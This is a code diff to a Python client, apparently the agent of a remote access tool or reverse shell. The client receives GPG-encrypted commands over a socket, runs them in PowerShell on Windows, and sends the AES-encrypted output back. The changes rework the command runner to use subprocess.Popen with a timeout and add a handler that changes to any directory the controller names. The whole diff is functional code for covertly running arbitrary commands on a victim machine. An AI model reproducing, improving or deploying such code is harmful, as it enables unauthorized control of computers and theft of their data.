@@ -8,6 +8,7 @@ import subprocess
 import json
 import binascii
 import asyncio
+import time
 from fitxategiak.fitxa import bialketa
 from fitxategiak.asimetric import asime
 from fitxategiak.aesencrypt import aesenc
@@ -107,23 +108,32 @@ class bezeroa(object):
     def cmdGlobal(self,cmd,sistem):
         print(cmd)
         if sistem == "nt":
-            result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
-            if result.stderr:
-                print("lengggg:")
-                print(len(result.stderr))
-                enResult = self.encriAes.encript(bytes(result.stderr,encoding='utf-8'))
+            result = subprocess.Popen(['powershell','-Command',cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            time.sleep(1)
+            result.terminate()
+            stdout , stderr = result.communicate()
+            if stderr:
+                enResult = self.encriAes.encript(bytes(stderr,encoding='utf-8'))
                 self.buffLengP(enResult)
                 self.so.send(enResult) 
-            if result.stdout:
-                print("lengggg:")
-                enResult = self.encriAes.encript(bytes(result.stdout,encoding='utf-8'))   
+            if stdout:
+                enResult = self.encriAes.encript(bytes(stdout,encoding='utf-8'))
                 self.buffLengP(enResult)
-                self.so.send(enResult)
-            else:
-                enResult = self.encriAes.encript(bytes("ok",encoding='utf-8'))
+                self.so.send(enResult) 
+            elif  len(stdout) == 0 and len(stderr) == 0:
+                print(len(stdout))
+                print(len(stderr))
+                enResult = self.encriAes.encript(bytes('ok',encoding='utf-8'))
                 self.buffLengP(enResult)
-                self.so.send(enResult)   
-    
+                self.so.send(enResult) 
+
+
+    def rutasCD(self,ruta):
+        try:
+         os.chdir(ruta)
+        except:
+          None
+
     def windows_Com(self):
         cmd = self.so.recv(1024) 
         cmdDEc = self.GPG.decrypt(cmd)
@@ -199,12 +209,9 @@ while True:
             if fd != "":
                 arrComad.append(fd)
         if arrComad[0] == "cd":
-            print("cd")
-            print(arrComad)
-            drives = win32api.GetLogicalDriveStrings()
-            print(drives)
-            os.chdir("/users")
+            bezeroa.rutasCD(arrComad[1])
+            
         if arrComad[0] == "exit":
             break
-        else:
+        elif arrComad[0] != "exit" and arrComad[0] != "cd":
             bezeroa.cmdGlobal(comand,os.name)
